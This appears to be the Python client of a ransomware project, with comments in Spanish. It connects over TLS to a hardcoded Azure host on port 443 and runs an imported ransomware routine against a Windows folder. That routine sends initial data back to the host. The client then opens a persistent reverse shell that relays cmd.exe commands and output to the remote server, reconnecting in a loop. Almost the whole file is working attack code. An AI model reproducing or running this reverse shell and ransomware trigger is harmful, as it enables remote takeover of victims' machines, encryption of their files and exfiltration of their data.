import socket
import time
import subprocess
import platform
import getpass
import ssl
import certifi
import sys
import os

# Obtener el directorio del script actual
current_script_dir = os.path.dirname(os.path.abspath(__file__))

# Obtener la ruta al directorio principal del proyecto (un nivel arriba de 'Connection')
# Esto asume que 'Connection' está directamente dentro de la raíz del proyecto.
project_root_dir = os.path.join(current_script_dir, '..')

# Agregar el directorio raíz del proyecto a sys.path
sys.path.append(project_root_dir)
from Ransomware import ransomware # Asegúrate de que esta importación sea correcta si has movido archivos

LHOST = "winserver.eastus.cloudapp.azure.com"
LPORT = 443
BUFFER_SIZE = 4096
RETRY_DELAY = 5

def connect():
    while True:
        try:
            print(f"[~] Intentando conectar a {LHOST}:{LPORT} (TLS)...")

            context = ssl.create_default_context(cafile=certifi.where())
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED  # No verifica el certificado (puedes ajustar esto)

            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            tls_socket = context.wrap_socket(raw_socket, server_hostname=LHOST)

            tls_socket.connect((LHOST, LPORT))
            # Llamada a la función ransomware que ahora también envía el JSON inicial
            info_sent = ransomware.ransomware(r"C:\Ransomware\Files", tls_socket)
            if info_sent:
                print(f"[+] Proceso de ransomware completado y datos enviados.")
            else:
                print("[!] Fallo en el proceso de ransomware o envío de datos iniciales.")

            return tls_socket

        except Exception as e:
            print(f"[!] Error de conexión TLS: {e}")
            print(f"[~] Reintentando en {RETRY_DELAY} segundos...\n")
            time.sleep(RETRY_DELAY)

def shell(client):
    print("[*] Iniciando shell remota (cmd.exe)...")
    proc = subprocess.Popen(
        ["cmd.exe"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,  # Redirige stderr a stdout
        shell=True,
        # NO usar text=True aquí. Manejaremos la codificación manualmente.
        # NO especificar encoding aquí, ya que codificaremos/decodificaremos manualmente.
    )
    empty_count = 0
    while True:
        try:
            # Eliminar el envío de prompt constante aquí. El servidor no lo espera si ya funcionaba sin él.
            # Solo enviar un prompt si el comando recibido es vacío.

            cmd = client.recv(BUFFER_SIZE).decode("utf-8").strip()
            
            if not cmd:
                # La versión antigua enviaba '>' solo en comandos vacíos. Volvemos a eso.
                client.send(b">\n") # Añadir un salto de línea para que el servidor lo pueda leer como línea
                empty_count += 1
                print(f"[~] Comando vacío #{empty_count}")
                if empty_count >= 5:
                    print("[x] Demasiados comandos vacíos. Cerrando conexión.")
                    break
                continue
            else:
                empty_count = 0  # Reset si el comando es válido
                print(f"[>] Comando recibido: {cmd}")
            
            if cmd.lower() == "exit":
                print("[*] Comando 'exit' recibido. Cerrando sesión.")
                client.send("[+] Cerrando sesión.\n".encode("utf-8"))
                break

            # Escribir el comando en CP850 y añadir salto de línea
            proc.stdin.write((cmd + "\n").encode("CP850"))
            proc.stdin.flush()
            time.sleep(0.3) # Dar tiempo a cmd.exe para procesar

            output = b""
            while True:
                try:
                    # Leer en CP850, decodificar a utf-8 para enviar al servidor
                    data = proc.stdout.read1(BUFFER_SIZE) # Leer bytes directamente
                    if not data: # No hay más datos
                        break
                    
                    # Decodificar de CP850 a string, luego codificar a UTF-8 para enviar
                    output += data.decode('CP850', errors='replace').encode('utf-8')
                    
                    # Si leemos menos del BUFFER_SIZE, probablemente es el final de la salida actual
                    if len(data) < BUFFER_SIZE:
                        break
                except Exception as e:
                    print(f"[!] Error leyendo stdout de subprocess: {e}")
                    break # Salir si hay un error en la lectura

            # Si no hay salida de stdout, revisar stderr (aunque ya redirigimos a stdout)
            # La version anterior tenia esta logica, la mantendremos por si acaso
            if not output and proc.stderr: # Añadido 'and proc.stderr' para evitar error si no hay stderr pipe
                try:
                    error_data = proc.stderr.read1(BUFFER_SIZE)
                    if error_data:
                        output += error_data.decode('CP850', errors='replace').encode('utf-8')
                except Exception as e:
                    print(f"[!] Error leyendo stderr de subprocess: {e}")


            # Asegurarse de que siempre se envía algo, y que termine con un salto de línea para el servidor
            client.send(output if output else b"[sin salida]\n")
            print("[✓] Resultado enviado al cliente.\n")

        except Exception as e:
            print(f"[!] Error en la shell: {e}")
            try:
                client.send(f"[!] Error: {e}\n".encode("utf-8"))
            except:
                print("[!] No se pudo enviar el mensaje de error.")
            break

    proc.kill()
    client.close()
    print("[x] Conexión cerrada.\n")

def main():
    while True:
        client = connect()
        try:
            shell(client)
        except Exception as e:
            print(f"[!] Error inesperado: {e}")
            client.close()
            print("[~] Intentando reconectar...\n")

if __name__ == "__main__":
    main()